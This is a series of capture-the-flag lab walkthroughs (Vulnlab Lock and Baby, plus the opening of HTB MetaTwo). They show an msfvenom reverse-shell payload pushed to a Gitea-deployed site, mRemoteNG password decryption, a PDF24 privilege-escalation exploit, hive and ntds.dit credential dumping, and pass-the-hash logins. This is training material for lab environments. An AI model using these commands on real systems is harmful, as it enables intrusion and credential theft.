        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 995 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LOCK</span><br><span class="line">|   NetBIOS_Domain_Name: LOCK</span><br><span class="line">|   NetBIOS_Computer_Name: LOCK</span><br><span class="line">|   DNS_Domain_Name: Lock</span><br><span class="line">|   DNS_Computer_Name: Lock</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-08T14:18:31+00:00</span><br><span class="line">5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-website.png" alt="Gitea website"></p><p>Possible Username: <code>ellen.freeman</code></p><p>Looking into the commits we can find the gitea personal token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/ellen.freeman/dev-scripts/commit/8b78e6c3024416bce55926faa3f65421a25d6370</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-Token.png" alt="Gitea Token"></p><p>Modifying the script so it uses the AUTH token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def format_domain(domain):</span><br><span class="line">    if not domain.startswith((&#x27;http://&#x27;, &#x27;https://&#x27;)):</span><br><span class="line">        domain = &#x27;https://&#x27; + domain</span><br><span class="line">    return domain</span><br><span class="line"></span><br><span class="line">def get_repositories(token, domain):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;Authorization&#x27;: f&#x27;token &#123;token&#125;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    url = f&#x27;&#123;domain&#125;/api/v1/user/repos&#x27;</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(f&#x27;Failed to retrieve repositories: &#123;response.status_code&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;Usage: python script.py &lt;gitea_domain&gt;&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    gitea_domain = format_domain(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    personal_access_token = &#x27;TOKEN&#x27;  # Use the provided token directly</span><br><span class="line">    if not personal_access_token:</span><br><span class="line">        print(&quot;Error: GITEA_ACCESS_TOKEN environment variable not set.&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        repos = get_repositories(personal_access_token, gitea_domain)</span><br><span class="line">        print(&quot;Repositories:&quot;)</span><br><span class="line">        for repo in repos:</span><br><span class="line">            print(f&quot;- &#123;repo[&#x27;full_name&#x27;]&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>we will get back the 2 repos she has made </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Repositories:</span><br><span class="line">- ellen.freeman/dev-scripts</span><br><span class="line">- ellen.freeman/website</span><br></pre></td></tr></table></figure><p>After cloning the website repo with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Readme-helpfull.png" alt="Helpful Readme"><br>we see in the readme.md that any change we make on the repo it will reflect on the actual website so now we can create a .aspx shell and place it on the website.</p><p>Generating a shell with msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure><p>And before we push our changes to the repo we need to setup git:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name ellen.freeman</span><br><span class="line">git config --global user.email ellen.freeman@lock.vl</span><br></pre></td></tr></table></figure><p>Inside the repo we will add the new file, commit it and push it to the repo:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add shell.aspx</span><br><span class="line">git commit -m &quot;shell&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>Then we start our listener and curl the wesbite for the shell to trigger:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nlvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://lock.vl/shell.aspx</span><br></pre></td></tr></table></figure><p><code>Sometimes it takes a couple of minutes untill the pipeline builds the changes we did on the repository, do not do multiple pushes to the repo as it restarts the process</code><br><img src="/images/Lock/Shell-as-Elen.png" alt="Shell as Ellen"></p><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><h3 id="Ellen-Freeman-to-Gale-Dekarios"><a href="#Ellen-Freeman-to-Gale-Dekarios" class="headerlink" title="Ellen.Freeman to Gale.Dekarios"></a>Ellen.Freeman to Gale.Dekarios</h3><p>Inside the <code>Directory of c:\Users\ellen.freeman\Documents</code> there is a <code>config.xml</code><br>taking a look into the xml we can see that its a file for Multi-Remote Next Generation Connection Manager <a href="https://mremoteng.org/">https://mremoteng.org/</a>. With a google search we can find a github repo that decripts the password that on the <code>config.xml</code><br><a href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gquere/mRemoteNG_password_decrypt</span><br><span class="line">cd mRemoteNG_password_decrypt-master</span><br><span class="line">python3 mremoteng_decrypt.py ../config.xml</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-PAss.png" alt="RDP Password"></p><p>Using xfreerdp we will establish an rdp session with the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.78.85 /u:Gale.Dekarios /p:</span><br></pre></td></tr></table></figure><h3 id="PDF24-CVE-2023-49147"><a href="#PDF24-CVE-2023-49147" class="headerlink" title="PDF24 - CVE-2023-49147"></a>PDF24 - CVE-2023-49147</h3><p>After getting into the rdp session we can grab the user flag and see that there is a program called PDF24 after a simple google search we can see that there is a privilege escalation exploit for it <a href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a></p><p>First we need to locate the msi installer, after some digging around (dont forget to look for hidden folders)<br><img src="/images/Lock/MSI-file.png" alt="MSI file"></p><p>Now we need to <code>SetOpLock.exe</code> to the machine, as we have rdp we can just copy paste it.</p><p>We will open two terminals in one of them we will lock the log file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetOpLock.exe &quot;C:\Program Files\PDF24\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure><p>And then we will patch the PDF24 app </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/RDP-exploits.png" alt="RDP exploits"></p><p>After you let it load you can follow the github instructions to get a shell:</p><ul><li>right click on the top bar of the cmd window</li><li>click on properties</li><li>under options click on the “Legacyconsolemode” link</li><li>open the link with a browser other than internet explorer or edge (both don’t open as SYSTEM when on Win11)</li><li>in the opened browser window press the key combination CTRL+o</li><li>type cmd.exe in the top bar and press Enter</li></ul><p><a href="https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464">https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Baby</title>
      <link href="/2025/03/08/VL-Baby/"/>
      <url>/2025/03/08/VL-Baby/</url>
      
        <content type="html"><![CDATA[<h2 id="Namap-Scan"><a href="#Namap-Scan" class="headerlink" title="Namap Scan"></a>Namap Scan</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65514 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-06 14:47:47Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=BabyDC.baby.vl</span><br><span class="line">| Issuer: commonName=BabyDC.baby.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-05T14:31:02</span><br><span class="line">| Not valid after:  2025-09-04T14:31:02</span><br><span class="line">| MD5:   48f2:c223:e5c4:356d:b768:8571:f1c6:8950</span><br><span class="line">| SHA-1: 03fd:ff73:d5e1:92bd:32bf:d747:c3fb:bb46:ff4e:6d2d</span><br><span class="line">|_ssl-date: 2025-03-06T14:49:20+00:00; -2h00m00s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: BABY</span><br><span class="line">|   NetBIOS_Domain_Name: BABY</span><br><span class="line">|   NetBIOS_Computer_Name: BABYDC</span><br><span class="line">|   DNS_Domain_Name: baby.vl</span><br><span class="line">|   DNS_Computer_Name: BabyDC.baby.vl</span><br><span class="line">|   DNS_Tree_Name: baby.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-06T14:48:39+00:00</span><br><span class="line">5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55620/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">59532/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 29424/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 15632/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 18953/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 41352/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-06T14:48:41</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure><h2 id="FOOTHOLD"><a href="#FOOTHOLD" class="headerlink" title="FOOTHOLD"></a>FOOTHOLD</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>After some enumeration we found that ldap had null session active</p><p><img src="/images/Baby/LDAP-ACCESS-NULL.png" alt="LDAP Access Null"></p><p>After running a query on the hole ldap with the below command we found that one user had a description field with a initial password <code>BabyStart123!</code>. We will try to use that password for the user teresa.bell and if it doesn’t work we will spray it to the rest of the users</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Teresa Bell, it, baby.vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: Teresa Bell</span><br><span class="line">sn: Bell</span><br><span class="line">description: Set initial password to BabyStart123!</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/LDAP-DISCR-PASSWORD.png" alt="LDAP Password Description"></p><p>The creds we found for Teresa.Bell but they dont work, so we will gather all of the users and password spray. We gathered the account names threw the below search BUT it was not the correct way:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;(objectClass=user)&quot; sAMAccountName -LLL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Getting-all-users.png" alt="Getting All Users"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Jacqueline.Barnett</span><br><span class="line">Ashley.Webb</span><br><span class="line">Hugh.George</span><br><span class="line">Leonard.Dyer</span><br><span class="line">Connor.Wilkinson</span><br><span class="line">Joseph.Hughes</span><br><span class="line">Kerry.Wilson</span><br><span class="line">Teresa.Bell</span><br></pre></td></tr></table></figure><p>We tried the usernames we gathered but it didnt work in any of them, we tried a more broad ldap search and another user popped up &#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://10.10.114.53 -b &quot;DC=baby,DC=vl&quot; &quot;user&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Hit-on-account(passchange).png" alt="Hit on Account Password Change"></p><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>The flag <code>STATUS_PASSWORD_MUST_CHANGE</code> tells us that we first need to change the password before we are able to log in to that user.Using the <code>smbpasswd</code> tool we were able to change Carolines password to <code>Password123!</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 10.10.114.53 -U &#x27;Caroline.Robinson&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Password_Change_Car.png" alt="Password Change Caroline"><img src="/images/Baby/netexec-after-pass-change.png" alt="Netexec After Password Change"></p><p>We can check if we have winrm access using the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm 10.10.114.53 -u Caroline.Robinson  -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Winrm-access.png" alt="Winrm Access"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Caroline.Robinson -p &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure><h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>The user we got has the SeBackupPrivilege flag anabled<br><img src="/images/Baby/sebackupriv.png" alt="SeBackupPrivilege"><br>Now we can copy the sam and system hive of HKLM and crack them lockaly</p><p>Create a temp directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir C:\temp</span><br></pre></td></tr></table></figure><p>Copy the sam and system hive of HKLM to C:\temp and then download them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam C:\temp\sam.hive</span><br></pre></td></tr></table></figure><p>and</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\temp\system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Save-huve.png" alt="Save Hive"><br>Go on the temp folder and download the system and the sam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download sam.hive</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download system.hive</span><br></pre></td></tr></table></figure><p>Finally use impacket-secretsdump and obtain the ntlm hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Cracked-admin-ash.png" alt="Cracked Admin Hash"><br>Now we can login using evil-winrm and get the root flag<br><img src="/images/Baby/Not-working.png" alt="Not Working"></p><h3 id="NTDS-DIT"><a href="#NTDS-DIT" class="headerlink" title="NTDS.DIT"></a>NTDS.DIT</h3><p>We can see that we cannon log into the machine as the hash we got is for the local administrator. We have to get the hash of the account in the domain (which has exactly the same name). In order to do this, we have to grab “ntds.dit” aswell</p><p>Using this script to copy the ntds.dit (xct script)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># save this in script.txt </span><br><span class="line">set metadata C:\Windows\Temp\meta.cabX </span><br><span class="line">set context clientaccessibleX </span><br><span class="line">set context persistentX </span><br><span class="line">begin backupX </span><br><span class="line">add volume C: alias cdriveX </span><br><span class="line">createX </span><br><span class="line">expose %cdrive% E:X </span><br><span class="line">end backupX</span><br></pre></td></tr></table></figure><p>Then we will run the below commands to get the ntds.dit from the “snapshot” we made</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># run diskshadow diskshadow /s script.txt </span><br><span class="line"># copy ntds to c robocopy /b E:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure><p>After downloading the <code>ntds.dit</code> to our local machine and run secretsdump again</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Baby/Got-admin-hash.png" alt="Got Admin Hash"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.114.53 -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92">https://api.vulnlab.com/api/v1/share?id=17abb51a-6f38-4585-b4e5-39cd6bf1ac92</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-MetaTwo</title>
      <link href="/2024/11/06/HTB-MetaTwo/"/>
      <url>/2024/11/06/HTB-MetaTwo/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p><code>nmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]</span><br><span class="line">|     Invalid command: try being more creative</span><br><span class="line">|_    Invalid command: try being more creative</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)</span><br><span class="line">|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)</span><br><span class="line">|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">|_http-server-header: nginx/1.18.0</span><br><span class="line">|_http-title: Did not follow redirect to http://metapress.htb/</span><br></pre></td></tr></table></figure><h1 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h1><p>Domain &#x3D; <code>metapress.htb</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.186 metapress.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><p>Its wordpress so we can do a basic scan with the tool <code>wpscan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://metapress.htb/</span><br></pre></td></tr></table></figure><p>The scan gave us some good info like <code>WordPress version 5.6.2</code> and  <code>PHP/8.0.24</code><br>Potential CVE if we manage to get a user CVE-2021-29447<br><a href="https://github.com/0xRar/CVE-2021-29447-PoC">https://github.com/0xRar/CVE-2021-29447-PoC</a></p><h1 id="Event-Form"><a href="#Event-Form" class="headerlink" title="Event Form"></a>Event Form</h1><p>The even form has no SSTI. Also i tried looking into other tickets to maybe get some email adresses.<br>The request is this and the <code>appointment_id</code> the base64 encoded<br><a href="http://metapress.htb/thank-you/?appointment_id=MQ==">http://metapress.htb/thank-you/?appointment_id=MQ==</a><br><code>echo &quot;MQ==&quot; | base64 -d</code> the output was 1 I will try to brute force it in burp<br>I run the first 100 ids but nothing expect mine came back with info</p><p>Looking into the source code we find that it runs bookingpress a CVE that might works is<br><a href="https://github.com/destr4ct/CVE-2022-0739">CVE-2022-0739</a></p><p>In the poc it says we need the <code>nonce</code> we can find that if we look 